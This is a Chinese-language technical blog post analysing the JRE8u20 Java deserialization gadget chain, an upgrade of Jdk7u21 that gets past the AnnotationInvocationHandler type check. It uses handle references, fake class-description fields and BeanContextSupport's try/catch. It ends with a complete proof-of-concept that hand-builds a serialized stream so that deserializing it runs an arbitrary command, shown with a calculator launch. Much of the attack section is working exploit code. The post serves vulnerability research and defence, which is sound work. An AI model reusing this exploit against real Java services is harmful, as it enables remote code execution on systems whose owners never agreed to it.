> 原文链接: https://www.anquanke.com//post/id/87270 


# 【技术分享】深度 - Java 反序列化 Payload 之 JRE8u20


                                阅读量   
                                **236149**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t01fe26fc55ff652aa9.jpg)](https://p0.ssl.qhimg.com/t01fe26fc55ff652aa9.jpg)

作者：[n1nty@360 A-Team](http://bobao.360.cn/member/contribute?uid=2913455218)

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**正文**

****

JRE8u20 是由 pwntester 基于另外两位黑客的代码改造出来的。因为此 payload 涉及到手动构造序列化字节流，使得它与 ysoserial 框架中所有的 payload 的代码结构都不太一样，所以没有被集成到 ysoserial 框架中。此 payload 在国内没有受到太大的关注也许与这个原因有关。我对此 payload 进行了相对深入的研究，学到了不少东西，在此与大家分享。



**需要知道的背景知识**

****

此 payload 是 ysoserial 中 Jdk7u21 的升级版，所以你需要知道 Jdk7u21 的工作原理

你需要对序列化数据的二进制结构有一些了解，serializationdumper 在这一点上可以帮到你。



**简述 Jdk7u21**

****

网上有不少人已经详细分析过 Jdk7u21 了，有兴趣大家自己去找找看。

**大概流程如下：**

TemplatesImpl 类可被序列化，并且其内部名为 __bytecodes 的成员可以用来存储某个 class 的字节数据

通过 TemplatesImpl 类的 getOutputProperties 方法可以最终导致 __bytecodes 所存储的字节数据被转换成为一个 Class（通过 ClassLoader.defineClass），并实例化此 Class，导致 Class 的构造方法中的代码被执行。

利用 LinkedHashSet 与 AnnotationInvocationHandler 来触发 TemplatesImpl 的 getOutputProperties 方法。这里的流程有点多，不展开了。



**Jdk7u21 的修补**

****

Jdk7u21 如其名只能工作在 7u21 及之前的版本，因为在后续的版本中，此 payload 依赖的 AnnotationInvocationHandler 的反序列化逻辑发生了改变。其 readObject 方法中加入了一个如下的检查：

```
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException `{`
    var1.defaultReadObject();
    AnnotationType var2 = null;
    try `{`
        var2 = AnnotationType.getInstance(this.type);
    `}` catch (IllegalArgumentException var9) `{`
        throw new InvalidObjectException("Non-annotation 
type in annotation serial stream");
    `}`
/// 省略了后续代码
`}`
```

可以看到在反序列化 AnnotationInvocationHandler 的过程中，如果 this.type 的值不是注解类型的，则会抛出异常，这个异常会打断整个反序列化的流程。而 7u21 的 payload 里面，我们需要 this.type 的值为 Templates.class 才可以，否则我们是无法利用 AnnotationInvocationHandler 来调用到 getOutputProperties 方法。正是这个异常，使得此 payload 在后续的JRE 版本中失效了。强行使用的话会看到如下的错误：



```
Exception in thread "main" java.io.InvalidObjectException: Non-annotation type in annotation serial stream
at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:341)
.....
```



**绕过的思路**

****

仔细看 **AnnotationInvocationHandler.readObject** 方法中的代码你会发现大概步骤是：

```
var1.defaultReadObject();
```

检查 this.type，非注解类型则抛出异常。

代码中先利用 var1.defaultReadObject() 来还原了对象（从反序列化流中还原了 AnnotationInvocationHandler 的所有成员的值），然后再进行异常的抛出。也就是说，AnnotationInvocationHandler 这个对象是先被成功还原，然后再抛出的异常。这里给了我们可趁之机。

（以下所有的内容我会省略大量的细节，为了更好的理解建议各位去学习一下 Java 序列化的规范。）

<br>

**一些小实验**

****

**实验 1：序列化中的引用机制**



```
ObjectOutputStream out = new ObjectOutputStream(
new FileOutputStream(new File("/tmp/ser")));
Date d = new Date();
out.writeObject(d);
out.writeObject(d);
out.close();
```

向 /tmp/ser 中写入了两个对象，利用 serializationdump 查看一下写入的序列化结构如下。



```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73 // 这里是第一个 writeObject 写入的 date 对象
    TC_CLASSDESC - 0x72
      className
        Length - 14 - 0x00 0e
        Value - java.util.Date - 0x6a6176612e7574696c2e44617465
      serialVersionUID - 0x68 6a 81 01 4b 59 74 19
      newHandle 0x00 7e 00 00
      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE
      fieldCount - 0 - 0x00 00
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 01 // 为此对象分配一个值为 0x00 7e 00 01 的 handle，要注意的是这个 handle 并没有被真正写入文件，而是在序列化和反序列化的过程中计算出来的。serializationdumper 这个工具在这里将它显示出来只是为了方便分析。
    classdata
      java.util.Date
        values
        objectAnnotation
          TC_BLOCKDATA - 0x77
            Length - 8 - 0x08
            Contents - 0x0000015fd4b76bb1
          TC_ENDBLOCKDATA - 0x78
  TC_REFERENCE - 0x71 // 这里是第二个 writeObject 对象写入的 date 对象
    Handle - 8257537 - 0x00 7e 00 01
```

可以发现，因为我们两次 writeObject 写入的其实是同一个对象，所以 Date 对象的数据只在第一次 writeObject 的时候被真实写入了。而第二次 writeObject 时，写入的是一个 TC_REFERENCE 的结构，随后跟了一个4 字节的 Int 值，值为 0x00 7e 00 01。这是什么意思呢？意思就是第二个对象引用的其实是 handle 为 0x00 7e 00 01 的那个对象。

在反序列化进行读取的时候，因为之前进行了两次 writeObject，所以为了读取，也应该进行两次 readObject：

 第一次 readObject 将会读取 TC_OBJECT 表示的第 1 个对象，发现是 Date 类型的对象，然后从流中读取此对象成员的值并还原。并为此 Date 对象分配一个值为 0x00 7e 00 01 的 handle。

第二个 readObject 会读取到 TC_REFERENCE，说明是一个引用，引用的是刚才还原出来的那个 Date 对象，此时将直接返回之前那个 Date 对象的引用。

**实验 2：还原 readObject 中会抛出异常的对象**

看实验标题你就知道，这是为了还原 AnnotationInvocationHandler 而做的简化版的实验。

假设有如下 Passcode 类



```
public class Passcode implements Serializable `{`
    private static final long serialVersionUID = 100L;
    private String passcode;
    
    public Passcode(String passcode) `{`
        this.passcode = passcode;
    `}`
    private void readObject(ObjectInputStream input) 
    throws Exception `{`
        input.defaultReadObject();
        if (!this.passcode.equals("root")) `{`
            throw new Exception("pass code is not correct");
        `}`
    `}`
`}`
```

根据 readObject 中的逻辑，似乎我们只能还原一个 passcode 成员值为 root 的对象，因为如果不是 root ，就会有异常来打断反序列化的操作。那么我们如何还原出一个 passcode 值不是 root 的对象呢？我们需要其他类的帮助。

假设有一个如下的 WrapperClass 类：



```
public class WrapperClass implements Serializable `{`
    private static final long serialVersionUID = 200L;
    private void readObject(ObjectInputStream input) 
    throws Exception `{`
        input.defaultReadObject();
        try `{`
            input.readObject();
        `}` catch (Exception e) `{`
            System.out.println("WrapperClass.readObject: 
input.readObject error");
        `}`
    `}`
`}`
```

此类在自身 readObject 的方法内，在一个 try/catch 块里进行了 input.readObject 来读取当前对象数据区块中的下一个对象。

**解惑**

假设我们生成如下二进制结构的序列化文件（简化版）：



```
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73 // WrapperClass 对象
    TC_CLASSDESC - 0x72
      ...
      // 省略，当然这里的flag 要被标记为 SC_SERIALIZABLE | SC_WRITE_METHOD
    classdata // 这里是 WrapperClass 对象的数据区域
      TC_OBJECT - 0x73 // 这里是 passcode 值为 "wrong passcode" 的 Passcode 类对象，并且在反序列化的过程中为此对象分配 Handle，假如说为 0x00 7e 00 03
        ...
  TC_REFERENCE - 0x71
    Handle - 8257537 - 0x00 7e 00 03 // 这里重新引用上面的那个 Passcode 对象
```

WrapperClass.readObject 会利用 input.readObject 来尝试读取并还原 Passcode 对象。虽然在还原 Passcode 对象时，出现了异常，但是被 try/catch 住了，所以序列化的流程没有被打断。Passcode 对象被正常生成了并且被分配了一个值为 0x00 7e 00 03 的 handle。随后流里出现了 TC_REFERENCE 重新指向了之前生成的那个 Passcode 对象，这样我们就可以得到一个在正常情况下无法得到的 passcode 成员值为 "wrong passcode" 的 Passcode 类对象。

读取的时候需要用如下代码进行两次 readObject：



```
ObjectInputStream in = new ObjectInputStream(
new FileInputStream(new File("/tmp/ser")));
in.readObject(); // 第一次，读出 Wrapper Class
System.out.println(in.readObject()); // 第二次，读出 Passcode 对象
```

**实验 3：利用 SerialWriter 给对象插入假成员**

SerialWriter 是我自己写的用于生成自定义序列化数据的一个工具。它的主要亮点就在于可以很自由的生成与拼接任意序列化数据，可以很方便地做到 Java 原生序列化不容易做到的一些事情。它不完全地实现了 Java 序列化的一些规范。简单地理解就是 SerialWriter 是我写的一个简化版的 ObjectOutputStream。目前还不是很完善，以后我会将代码上传至 github。

如果用 SerialWriter 来生成实验 2 里面提到的那段序列化数据的话，代码如下：



```
public static void test2() throws Exception `{`
    Serialization ser = new Serialization();
    // wrong passcode ，反序列化时会出现异常
    Passcode passcode = new Passcode("wrong passcode"); 
    TCClassDesc desc = new TCClassDesc(
    "util.n1nty.testpayload.WrapperClass", 
(byte)(SC_SERIALIZABLE | SC_WRITE_METHOD));
    TCObject.ObjectData data = new TCObject.ObjectData();
    // 将 passcode 添加到 WrapperClass 对象的数据区
    // 使得 WrapperClass.readObject 内部的 input.readObject 
    // 可以将它读出
    data.addData(passcode); 
    TCObject obj = new TCObject(ser);
    obj.addClassDescData(desc, data, true);
    ser.addObject(obj);
    // 这里最终写入的是一个 TC_REFERENCE
    ser.addObject(passcode); 
    ser.write("/tmp/ser");
    ObjectInputStream in = new ObjectInputStream(
    new FileInputStream(new File("/tmp/ser")));
    in.readObject();
    System.out.println(in.readObject());
`}`
```



**给对象插入假成员**

****

什么意思呢？序列化数据中，有一段名为 TC_CLASSDESC 的数据结构，此数据结构中保存了被序列化的对象所属的类的成员结构（有多少个成员，分别叫什么名字，以及都是什么类型的。）

还是拿上面的 Passcode 类来做例子，序列化一个 Passcode 类的对象后，你会发现它的 TC_CLASSDESC 的结构如下：  

```
TC_CLASSDESC - 0x72
              className
                Length - 31 - 0x00 1f    // 类名长度
                Value - util.n1nty.testpayload.Passcode - 0x7574696c2e6e316e74792e746573747061796c6f61642e50617373636f6465    //类名
              serialVersionUID - 0x00 00 00 00 00 00 00 64
              newHandle 0x00 7e 00 02
              classDescFlags - 0x02 - SC_SERIALIZABLE
              fieldCount - 1 - 0x00 01    // 成员数量，只有 1 个
              Fields
                0:
                  Object - L - 0x4c    
                  fieldName
                    Length - 8 - 0x00 08    // 成员名长度
                    Value - passcode - 0x70617373636f6465    // 成员名
                  className1
                    TC_STRING - 0x74    
                      newHandle 0x00 7e 00 03
                      Length - 18 - 0x00 12    // 成员类型名的长度
                      Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b    // 成员类型，为Ljava/lang/String;
```

如果我们在这段结构中，插入一个 Passcode 类中根本不存在的成员，也不会有任何问题。这个虚假的值会被反序列化出来，但是最终会被抛弃掉，因为 Passcode 中不存在相应的成员。但是如果这个值是一个对象的话，反序列化机制会为这个值分配一个 Handle。JRE8u20 中利用到了这个技巧来生成 AnnotationInvocationHandler 并在随后的动态代理对象中引用它。利用 ObjectOutputStream 我们是无法做到添加假成员的，这种场景下 SerialWriter 就派上了用场。（类似的技巧还有：在 TC_CLASSDESC 中把一个类标记为 SC_WRITE_METHOD，然后就可以向这个类的数据区域尾部随意添加任何数据，这些数据都会在这个类被反序列化的同时也自动被反序列化）

<br>

**回到主题 – Payload JRE8u20**

****

上面已经分析过是什么问题导致了 Jdk7u21 不能在新版本中使用。也用了几个简单的实验来向大家展示了如何绕过这个问题。那么现在回到主题。

JRE8u20 中利用到了名为 java.beans.beancontext.BeanContextSupport 的类。 此类与上面实验所用到的 WrapperClass 的作用是一样的，只不过稍复杂一些。

大体步骤如下：

JRE8u20 中向 HashSet 的 TC_CLASSDESC 中添加了一个假属性，属性的值就是BeanContextChild 类的对象。

BeanContextSupport 在反序列化的过程中会读到 this.type 值为 Templates.class 的 AnnotationInvocationHandler 类的对象，因为 BeanContextChild 中有 try/catch，所以还原 AnnotationInvocationHandler 对象时出的异常被处理掉了，没有打断反序列化的逻辑。同时 AnnotationInvocationHandler 对象被分配了一个 handle。

然后就是继续 Jdk7u21 的流程，后续的 payload 直接引用了之前创建出来的 AnnotationInvocationHandler 。

pwntester 在 github 上传了他改的 Poc，但是因为他直接将序列化文件的结构写在了 Java 文件的一个数组里面，而且对象间的 handle 与 TC_REFERENCE 的值都需要人工手动修正，所以非常不直观。而且手动修正 handle 是一个很烦人的事情。

为了证明我不是一个理论派 🙂 ，我用 SerialWriter 重新实现了整个 Poc。代码如下：（手机端看不全代码，在电脑上看吧）

```
package util.n1nty.testpayload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import util.Gadgets;
import util.Reflections;
import util.n1nty.gen.*;
import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextChild;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.util.HashMap;
import java.util.Map;
import static java.io.ObjectStreamConstants.*;
public class TestRCE `{`
    public static Templates makeTemplates(String command) `{`
        TemplatesImpl templates = null;
        try `{`
            templates =  Gadgets.createTemplatesImpl(command);
            Reflections.setFieldValue(templates, "_auxClasses", null);
        `}` catch (Exception e) `{`
            e.printStackTrace();
        `}`
        return templates;
    `}`
    public static TCObject makeHandler(HashMap map, Serialization ser) throws Exception `{`
        TCObject handler = new TCObject(ser) `{`
            @Override
            public void doWrite(DataOutputStream out, HandleContainer handles) throws Exception `{`
                ByteArrayOutputStream byteout = new ByteArrayOutputStream();
                super.doWrite(new DataOutputStream(byteout), handles);
                byte[] bytes = byteout.toByteArray();
                /**
                 * 去掉最后的 TC_ENDBLOCKDATA 字节。因为在反序列化 annotation invocation handler 的过程中会出现异常导致序列化的过程不能正常结束
                 * 从而导致 TC_ENDBLOCKDATA 这个字节不能被正常吃掉
                 * 我们就不能生成这个字节
                 * */
                out.write(bytes, 0, bytes.length -1);
            `}`
        `}`;
        // 手动添加  SC_WRITE_METHOD，否则会因为反序列化过程中的异常导致 ois.defaultDataEnd 为 true，导致流不可用。
        TCClassDesc desc = new TCClassDesc("sun.reflect.annotation.AnnotationInvocationHandler", (byte)(SC_SERIALIZABLE | SC_WRITE_METHOD));
        desc.addField(new TCClassDesc.Field("memberValues", Map.class));
        desc.addField(new TCClassDesc.Field("type", Class.class));
        TCObject.ObjectData data = new TCObject.ObjectData();
        data.addData(map);
        data.addData(Templates.class);
        handler.addClassDescData(desc, data);
        return handler;
    `}`
    public static TCObject makeBeanContextSupport(TCObject handler, Serialization ser) throws Exception `{`
        TCObject obj = new TCObject(ser);
        TCClassDesc beanContextSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextSupport");
        TCClassDesc beanContextChildSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextChildSupport");
        beanContextSupportDesc.addField(new TCClassDesc.Field("serializable", int.class));
        TCObject.ObjectData beanContextSupportData = new TCObject.ObjectData();
        beanContextSupportData.addData(1); // serializable
        beanContextSupportData.addData(handler);
        beanContextSupportData.addData(0, true); // 防止 deserialize 内再执行 readObject
        beanContextChildSupportDesc.addField(new TCClassDesc.Field("beanContextChildPeer", BeanContextChild.class));
        TCObject.ObjectData beanContextChildSupportData = new TCObject.ObjectData();
        beanContextChildSupportData.addData(obj); // 指回被序列化的 BeanContextSupport 对象
        obj.addClassDescData(beanContextSupportDesc, beanContextSupportData, true);
        obj.addClassDescData(beanContextChildSupportDesc, beanContextChildSupportData);
        return obj;
    `}`
    public static void main(String[] args) throws Exception `{`
        Serialization ser = new Serialization();
        Templates templates = makeTemplates("open /Applications/Calculator.app");
        HashMap map = new HashMap();
        map.put("f5a5a608", templates);
        TCObject handler = makeHandler(map, ser);
        TCObject linkedHashset = new TCObject(ser);
        TCClassDesc linkedhashsetDesc = new TCClassDesc("java.util.LinkedHashSet");
        TCObject.ObjectData linkedhashsetData = new TCObject.ObjectData();
        TCClassDesc hashsetDesc = new TCClassDesc("java.util.HashSet");
        hashsetDesc.addField(new TCClassDesc.Field("fake", BeanContextSupport.class));
        TCObject.ObjectData hashsetData = new TCObject.ObjectData();
        hashsetData.addData(makeBeanContextSupport(handler, ser));
        hashsetData.addData(10, true); // capacity
        hashsetData.addData(1.0f, true); // loadFactor
        hashsetData.addData(2, true); // size
        hashsetData.addData(templates);
        TCObject proxy = Util.makeProxy(new Class[]`{`Map.class`}`, handler, ser);
        hashsetData.addData(proxy);
        linkedHashset.addClassDescData(linkedhashsetDesc, linkedhashsetData);
        linkedHashset.addClassDescData(hashsetDesc, hashsetData, true);
        ser.addObject(linkedHashset);
        ser.write("/tmp/ser");
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(new File("/tmp/ser")));
        System.out.println(in.readObject());
    `}`
`}`
```



有对文章内容感兴趣的小伙伴可以加作者的微信号公众号**n1nty-talks**，欢迎技术交流。



**参考资料**

****

[http://wouter.coekaerts.be/2015/annotationinvocationhandler](http://wouter.coekaerts.be/2015/annotationinvocationhandler) 

这一篇资料帮助非常大，整个 payload 的思路就是这篇文章提出来的。作者对序列化机制有长时间的深入研究。

[https://gist.github.com/frohoff/24af7913611f8406eaf3](https://gist.github.com/frohoff/24af7913611f8406eaf3) 

[https://github.com/pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) 
